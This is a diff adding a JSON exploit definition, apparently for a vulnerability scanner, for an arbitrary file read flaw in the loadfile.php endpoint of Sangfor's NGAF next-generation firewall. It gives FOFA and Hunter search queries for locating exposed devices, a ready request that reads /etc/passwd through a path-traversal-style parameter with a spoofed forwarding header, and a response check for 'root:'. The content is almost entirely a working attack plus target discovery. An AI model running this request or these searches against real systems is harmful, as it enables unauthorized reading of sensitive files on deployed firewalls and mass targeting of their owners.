@@ -1,0 +1,41 @@
+{
+  "product": "深信服下一代防火墙NGAF",
+  "vul_name": "深信服下一代防火墙NGAF loadfile.php任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "深信服下一代防火墙NGAF存在任意文件读取漏洞，攻击者可以利用该漏洞获取敏感信息。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "\"Redirect.php?url=/LogInOut.php\" && port=\"85\"",
+    "Hunter": "web.body=\"LogInOut.php?type=logout\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_37113223/article/details/136361202",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/svpn_html/loadfile.php?file=/etc/./passwd",
+      "header": {
+        "y-forwarded-for": "127.0.0.1"
+      }
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "root:"
+        }
+      ]
+    }
+  }
+}
